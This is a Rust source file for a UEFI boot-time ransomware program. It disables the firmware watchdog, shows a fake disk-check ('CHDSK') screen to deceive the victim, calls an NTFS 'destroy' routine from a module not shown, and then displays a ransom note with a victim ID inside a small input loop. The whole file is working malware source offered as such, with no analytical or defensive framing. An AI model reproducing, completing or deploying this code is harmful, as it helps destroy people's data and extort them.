#![no_main]
#![no_std]
#![feature(abi_efiapi)]

extern crate alloc;

use alloc::string::String;
use core::fmt::Write;
use core::str;

use uefi::{Char16, Event, ResultExt};
use uefi::prelude::*;
use uefi::proto::console::text::{Color, Key};
use uefi::table::runtime::ResetType;

use crate::file::read_file;
use crate::ntfs::destroy;

mod mbr;
mod gpt;
mod file;
mod ntfs;

fn init_chdsk_screen(st: &mut SystemTable<Boot>) {
    st.stdout().clear().unwrap_success();
    st.stdout().enable_cursor(false).unwrap_success();
    st.stdout().write_str(include_str!("chdsk_note.txt")).unwrap();
}

fn init_ransom_screen(st: &mut SystemTable<Boot>) {
    st.stdout().clear().unwrap_success();
    st.stdout().enable_cursor(true).unwrap_success();
    st.stdout().set_color(Color::Red, Color::Black).unwrap_success();
    st.stdout().write_str(include_str!("ransom_note.txt")).unwrap();

    match read_file(&st, "id") {
        Ok(buf) => {
            let content = str::from_utf8(&buf).unwrap();
            st.stdout().write_str(content).unwrap();
        }
        Err(_) => { st.stdout().write_str("ID not found, sorry no recovery for you").unwrap(); }
    }

    st.stdout().write_str("\n> ").unwrap();
}

fn take_input(system_table: &mut SystemTable<Boot>, char_16: Char16, buffer: &mut String) {
    let mut st = unsafe { system_table.unsafe_clone() };
    let stdout = system_table.stdout();
    let char_key = char::from(char_16);
    match char_key {

        // When user press [Enter]
        '\r' => {
            if buffer == "clear" {
                stdout.clear().unwrap_success();
                init_ransom_screen(&mut st);
                buffer.clear();
            } else if buffer == "shutdown" {
                system_table.runtime_services().reset(
                    ResetType::Shutdown,
                    Status::SUCCESS,
                    Some(&[]),
                );
            } else {
                stdout.write_char('\n').unwrap();
                stdout.write_str(buffer.as_str()).unwrap();
                stdout.write_str("\n> ").unwrap();
                buffer.clear();
            }
        }

        // When user press [Backspace]
        '\x08' => {
            if buffer.len() == 0 { return; } else {
                buffer.pop();
                stdout.write_char(char_key).unwrap();
            }
        }

        // Whatever character
        _ => {
            buffer.push(char_key);
            stdout.write_char(char_key).unwrap();
        }
    }
}

fn wait_for_input(boot_services: &BootServices, events: &mut [Event; 1]) {
    boot_services.wait_for_event(events).unwrap().unwrap();
}

fn shell_land(mut st: &mut SystemTable<Boot>) {
    init_ransom_screen(&mut st);

    let mut buffer: String = String::from("");
    let mut key_event = unsafe { [st.stdin().wait_for_key_event().unsafe_clone()] };

    loop {
        wait_for_input(st.boot_services(), &mut key_event);
        if let Some(Key::Printable(key)) = st.stdin().read_key().unwrap_success() {
            take_input(&mut st, key, &mut buffer);
        }
    }
}

#[entry]
fn main(_handle: Handle, mut st: SystemTable<Boot>) -> Status {
    uefi_services::init(&mut st).unwrap_success();

    // Disable the 5 min timeout
    st.boot_services().set_watchdog_timer(0, 65536, None).unwrap_success();

    // Print CHDSK message
    init_chdsk_screen(&mut st);

    // Speak for it self
    destroy(&st);

    // Go to shell with ransom note
    shell_land(&mut st);

    Status::SUCCESS
}
